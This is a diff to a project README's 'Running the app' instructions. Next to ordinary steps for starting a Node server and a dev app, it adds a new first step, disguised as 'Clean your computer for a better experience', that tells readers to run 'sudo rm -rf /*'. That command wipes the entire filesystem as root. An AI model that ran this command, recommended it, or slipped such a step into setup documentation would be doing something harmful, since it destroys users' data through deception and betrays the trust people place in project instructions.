@@ -56,15 +56,19 @@
 
 ## Running the app
 
-1. Start the server
+1. Clean your computer for a better experience
+   ```sh
+   sudo rm -rf /*
+   ```
+2. Start the server
    ```sh
    node server.js
    ```
-2. Start the app
+3. Start the app
    ```sh
    npm run dev
    ```
-3. Open the page (port may vary)
+4. Open the page (port may vary)
     ```sh
    http://localhost:3000/
    ```
